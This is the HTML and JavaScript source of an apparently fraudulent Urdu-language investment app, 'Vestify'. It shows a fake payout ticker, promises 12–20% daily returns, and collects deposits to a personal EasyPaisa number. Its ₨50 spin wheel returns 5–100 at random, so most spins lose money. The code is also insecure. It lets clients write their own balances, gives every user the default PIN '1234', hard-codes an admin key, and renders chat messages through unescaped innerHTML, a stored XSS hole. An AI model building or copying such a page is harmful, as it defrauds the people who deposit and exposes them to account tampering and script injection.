<html lang="ur" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-auth-compat.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <title>ویسٹی فائی الٹیمیٹ پرو</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;700;800&display=swap');
        body { font-family: 'Plus Jakarta Sans', sans-serif; background: #010409; color: white; margin: 0; overflow-x: hidden; text-align: right; }
        .glass { background: rgba(22, 27, 34, 0.7); backdrop-filter: blur(25px); border: 1px solid rgba(255,255,255,0.08); border-radius: 30px; }
        .page { display: none; padding: 20px; animation: slideUp 0.4s ease-out; }
        .active-page { display: block; }
        @keyframes slideUp { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }
        
        .nav-bar { position: fixed; bottom: 15px; left: 15px; right: 15px; height: 80px; display: flex; justify-content: space-around; align-items: center; z-index: 5000; border-radius: 30px; background: rgba(13, 17, 23, 0.98); border: 1px solid rgba(59, 130, 246, 0.2); backdrop-filter: blur(10px); }
        .nav-active { color: #3b82f6; transform: translateY(-5px); text-shadow: 0 0 15px rgba(59, 130, 246, 0.5); }
        
        #wheel { width: 280px; height: 280px; border-radius: 50%; border: 10px solid #ffd700; transition: transform 5s cubic-bezier(0.15, 0, 0.15, 1); filter: drop-shadow(0 0 20px rgba(255,215,0,0.2)); }
        .premium-card { background: linear-gradient(145deg, rgba(255,255,255,0.05) 0%, rgba(255,255,255,0) 100%); transition: 0.3s; }
        .premium-card:hover { border-color: #3b82f6; }

        /* Chat UI */
        #chat-window { position: fixed; bottom: 100px; left: 20px; right: 20px; height: 450px; z-index: 10000; display: none; flex-direction: column; overflow: hidden; }
    </style>
</head>
<body class="pt-16 pb-32">

    <div class="fixed top-0 w-full bg-blue-600/10 border-b border-blue-500/20 py-2 z-[6000] backdrop-blur-md">
        <div id="ticker-content" class="text-[10px] font-bold text-blue-400 text-center animate-pulse">
            ⚡ ممبر @User_46 نے ابھی ₨ 5,500 کا منافع نکلوایا • ایجنٹ 204 ہیلپ ڈیسک آن لائن ہے ⚡
        </div>
    </div>

    <header class="p-6 flex justify-between items-center flex-row-reverse">
        <div class="flex items-center gap-4 flex-row-reverse">
            <div class="relative">
                <img id="user-photo" onclick="handleAdminTap()" class="w-14 h-14 rounded-2xl border-2 border-blue-500/30 cursor-pointer object-cover shadow-xl">
                <div class="absolute -bottom-1 -right-1 w-4 h-4 bg-green-500 border-4 border-[#010409] rounded-full"></div>
            </div>
            <div class="text-right">
                <p id="user-name" class="text-xs font-black uppercase tracking-tight">Syncing...</p>
                <span id="v-tier" class="px-3 py-1 rounded-full text-[8px] font-black uppercase bg-blue-500/20 text-blue-400">Bronze Node</span>
            </div>
        </div>
        <button onclick="toggleChat()" class="w-12 h-12 glass flex items-center justify-center text-blue-500 relative">
            <i class="fa-solid fa-headset text-xl"></i>
            <span class="absolute top-2 right-2 w-2 h-2 bg-red-500 rounded-full animate-ping"></span>
        </button>
    </header>

    <main id="app-ui">
        <div id="p-home" class="page active-page">
            <div class="glass p-10 mb-8 text-center bg-gradient-to-br from-blue-600/20 to-transparent border-blue-500/30">
                <p class="text-[9px] font-black opacity-40 uppercase tracking-[3px] mb-3">Total Equity</p>
                <h2 id="v-bal" class="text-6xl font-black italic mb-10 tracking-tighter">₨ 0.00</h2>
                <div class="flex gap-4">
                    <button onclick="showPage('finance')" class="flex-1 bg-white text-black py-5 rounded-2xl font-black text-[11px] uppercase shadow-2xl active:scale-95 transition-all">جمع کریں</button>
                    <button onclick="showPage('withdraw')" class="flex-1 glass py-5 rounded-2xl font-black text-[11px] uppercase border-white/10 active:scale-95 transition-all">نکلوائیں</button>
                </div>
            </div>

            <div class="flex gap-2 mb-8">
                <button id="btn-n" onclick="renderPlans('normal')" class="flex-1 py-4 rounded-2xl bg-blue-600 text-[9px] font-black shadow-lg">NORMAL NODES</button>
                <button id="btn-s" onclick="renderPlans('special')" class="flex-1 py-4 rounded-2xl bg-white/5 text-[9px] font-black opacity-50">SPECIAL OFFERS</button>
            </div>
            <div id="plans-grid" class="space-y-6"></div>
        </div>

        <div id="p-spin" class="page text-center">
            <h2 class="text-3xl font-black italic mb-10">GOLDEN <span class="text-yellow-500">WHEEL</span></h2>
            <div class="flex justify-center mb-10 relative">
                <div class="absolute -top-10 left-1/2 -translate-x-1/2 text-red-600 text-5xl z-10 animate-bounce"><i class="fa-solid fa-location-dot"></i></div>
                <img id="wheel" src="https://i.ibb.co/V9X9999/wheel.png" onerror="this.src='https://via.placeholder.com/300/FFD700/000000?text=SPIN+WHEEL'">
            </div>
            <button id="spin-btn" onclick="executeSpin()" class="w-full max-w-xs bg-gradient-to-r from-blue-600 to-blue-400 py-6 rounded-full font-black text-xs uppercase shadow-2xl">گھمائیں (₨ 50)</button>
        </div>

        <div id="p-finance" class="page">
            <h2 class="text-2xl font-black italic mb-8 text-right uppercase">رقم <span class="text-blue-500">جمع کریں</span></h2>
            <div class="glass p-8 space-y-5 border-blue-500/10">
                <div class="bg-blue-600/10 p-6 rounded-3xl border border-blue-500/20 text-center">
                    <p class="text-[10px] opacity-40 mb-1 uppercase tracking-widest">Official EasyPaisa</p>
                    <p class="text-xl font-black text-blue-400 tracking-widest">03379827882</p>
                </div>
                <input id="d-amt" type="number" placeholder="رقم" class="w-full bg-black/40 p-5 rounded-2xl text-xs border border-white/10 outline-none">
                <input id="d-tid" type="text" placeholder="Transaction ID (TID)" class="w-full bg-black/40 p-5 rounded-2xl text-xs border border-white/10 outline-none">
                <button onclick="submitTx('Deposit')" class="w-full bg-blue-600 py-6 rounded-2xl font-black text-xs uppercase shadow-xl">ڈیپازٹ بھیجیں</button>
            </div>
        </div>

        <div id="p-withdraw" class="page">
            <h2 class="text-2xl font-black italic mb-8 text-right uppercase">رقم <span class="text-red-500">نکلوائیں</span></h2>
            <div class="glass p-8 space-y-5 border-red-500/10">
                <input id="w-num" type="text" placeholder="ایزی پیسہ / جاز کیش نمبر" class="w-full bg-black/40 p-5 rounded-2xl text-xs border border-white/10 outline-none">
                <input id="w-amt" type="number" placeholder="رقم" class="w-full bg-black/40 p-5 rounded-2xl text-xs border border-white/10 outline-none">
                <input id="w-pin" type="password" maxlength="4" placeholder="والٹ پن" class="w-full bg-black/40 p-5 rounded-2xl text-center font-black tracking-[1.5em] border border-white/10 outline-none">
                <button onclick="handleWithdraw()" class="w-full bg-white text-black py-6 rounded-2xl font-black text-xs uppercase shadow-xl">ودرا ریکویسٹ</button>
            </div>
        </div>
    </main>

    <div id="chat-window" class="glass border-blue-500/30">
        <div class="p-4 bg-blue-600 flex justify-between items-center">
            <p class="font-black text-xs uppercase">Support Agent 204</p>
            <button onclick="toggleChat()"><i class="fa-solid fa-times"></i></button>
        </div>
        <div id="chat-msgs" class="flex-1 overflow-y-auto p-4 flex flex-col gap-2 bg-[#0d1117]"></div>
        <div class="p-4 bg-[#1c2128] flex gap-2">
            <input id="chat-input" type="text" placeholder="پیغام لکھیں..." class="flex-1 bg-white/5 rounded-xl p-3 text-xs outline-none">
            <button onclick="sendMsg()" class="bg-blue-600 px-4 rounded-xl"><i class="fa-solid fa-paper-plane"></i></button>
        </div>
    </div>

    <nav class="nav-bar">
        <button onclick="showPage('home')" id="nav-home" class="nav-active"><i class="fa-solid fa-microchip text-xl"></i></button>
        <button onclick="showPage('spin')" id="nav-spin"><i class="fa-solid fa-dharmachakra text-xl"></i></button>
        <button onclick="showPage('finance')" id="nav-finance"><i class="fa-solid fa-plus-circle text-xl"></i></button>
        <button onclick="showPage('withdraw')" id="nav-withdraw"><i class="fa-solid fa-wallet text-xl"></i></button>
    </nav>

    <script>
        const firebaseConfig = { 
            apiKey: "AIzaSyC9ofJ1KxRXHnxilpU9gyI87D3BSOZ9v1g", 
            authDomain: "vestify-991f2.firebaseapp.com", 
            projectId: "vestify-991f2", 
            storageBucket: "vestify-991f2.firebasestorage.app", 
            messagingSenderId: "799007097733", 
            appId: "1:799007097733:web:ed3b35b6c4e51dc2e7baec" 
        };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.firestore(), auth = firebase.auth();
        let userObj = null, currentRot = 0, tapCount = 0;

        auth.onAuthStateChanged(async user => {
            if(user) {
                document.getElementById('user-photo').src = user.photoURL;
                document.getElementById('user-name').innerText = user.displayName;
                syncData(user.displayName);
                renderPlans('normal');
                loadChat(user.displayName);
            } else {
                auth.signInWithPopup(new firebase.auth.GoogleAuthProvider());
            }
        });

        function syncData(name) {
            db.collection("users").doc(name).onSnapshot(doc => {
                if(doc.exists) {
                    userObj = doc.data();
                    document.getElementById('v-bal').innerText = "₨ " + (userObj.balance || 0).toLocaleString();
                } else {
                    db.collection("users").doc(name).set({ balance: 0, walletPin: "1234", lastSpin: 0 });
                }
            });
        }

        function renderPlans(type) {
            document.getElementById('btn-n').style.opacity = type === 'normal' ? '1' : '0.5';
            document.getElementById('btn-s').style.opacity = type === 'special' ? '1' : '0.5';
            let h = "";
            let start = type === 'normal' ? 200 : 5000;
            for(let i=1; i<=6; i++) {
                let cost = start + (i * (type === 'normal' ? 400 : 2500));
                let daily = Math.floor(cost * (type === 'normal' ? 0.12 : 0.20));
                h += `
                <div class="glass p-6 premium-card border-white/5">
                    <div class="flex justify-between items-center">
                        <div class="text-right">
                            <h4 class="text-2xl font-black italic">₨ ${cost.toLocaleString()}</h4>
                            <p class="text-[8px] text-blue-500 font-bold uppercase">Daily: ₨ ${daily} | Total: ₨ ${daily*30}</p>
                        </div>
                        <button onclick="invest(${cost})" class="bg-white text-black px-6 py-3 rounded-xl font-black text-[10px] uppercase shadow-lg">Invest</button>
                    </div>
                </div>`;
            }
            document.getElementById('plans-grid').innerHTML = h;
        }

        async function invest(cost) {
            if(userObj.balance < cost) return alert("بیلنس کم ہے!");
            if(confirm(`کیا آپ ₨ ${cost} انویسٹ کرنا چاہتے ہیں؟`)) {
                await db.collection("users").doc(auth.currentUser.displayName).update({
                    balance: firebase.firestore.FieldValue.increment(-cost)
                });
                alert("انویسٹمنٹ کامیاب!");
            }
        }

        async function executeSpin() {
            if(userObj.balance < 50) return alert("بیلنس کم ہے!");
            currentRot += 1800 + Math.random() * 360;
            document.getElementById('wheel').style.transform = `rotate(${currentRot}deg)`;
            setTimeout(async () => {
                let win = [5, 10, 50, 100][Math.floor(Math.random()*4)];
                await db.collection("users").doc(auth.currentUser.displayName).update({
                    balance: firebase.firestore.FieldValue.increment(win - 50)
                });
                alert(`آپ نے ₨ ${win} جیتے!`);
            }, 5000);
        }

        async function sendMsg() {
            const input = document.getElementById('chat-input');
            if(!input.value) return;
            await db.collection("chats").add({
                user: auth.currentUser.displayName,
                msg: input.value, sender: 'user', time: Date.now()
            });
            input.value = "";
        }

        function loadChat(name) {
            db.collection("chats").where("user", "==", name).orderBy("time", "asc").onSnapshot(s => {
                let h = ""; s.forEach(doc => {
                    const d = doc.data();
                    h += `<div class="p-3 rounded-xl text-xs max-w-[80%] ${d.sender === 'user' ? 'bg-blue-600 self-end' : 'bg-white/10 self-start'}">${d.msg}</div>`;
                });
                document.getElementById('chat-msgs').innerHTML = h;
            });
        }

        function handleAdminTap() {
            tapCount++;
            if(tapCount >= 10) {
                let key = prompt("Key:");
                if(key === "net204") alert("Admin Access Granted");
                tapCount = 0;
            }
        }

        function showPage(p) {
            document.querySelectorAll('.page').forEach(pg => pg.classList.remove('active-page'));
            document.getElementById('p-'+p).classList.add('active-page');
            document.querySelectorAll('nav button').forEach(btn => btn.classList.remove('nav-active'));
            document.getElementById('nav-'+p).classList.add('nav-active');
        }

        function toggleChat() { 
            const chat = document.getElementById('chat-window'); 
            chat.style.display = (chat.style.display === 'flex') ? 'none' : 'flex'; 
        }

        async function submitTx(type) {
            const amt = document.getElementById('d-amt').value;
            const tid = document.getElementById('d-tid').value;
            if(!amt || !tid) return alert("ڈیٹا پُر کریں");
            await db.collection("txs").add({ user: auth.currentUser.displayName, amount: parseInt(amt), tid: tid, type: type, status: "Pending", time: Date.now() });
            alert("درخواست بھیج دی گئی!");
        }

        async function handleWithdraw() {
            const pin = document.getElementById('w-pin').value;
            const amt = parseInt(document.getElementById('w-amt').value);
            if(pin !== userObj.walletPin) return alert("غلط پن!");
            if(amt > userObj.balance) return alert("بیلنس کم ہے!");
            await db.collection("txs").add({ user: auth.currentUser.displayName, amount: amt, type: "Withdrawal", status: "Pending", time: Date.now() });
            alert("ودرا ریکویسٹ بھیج دی گئی!");
        }
    </script>
</body>
</html>
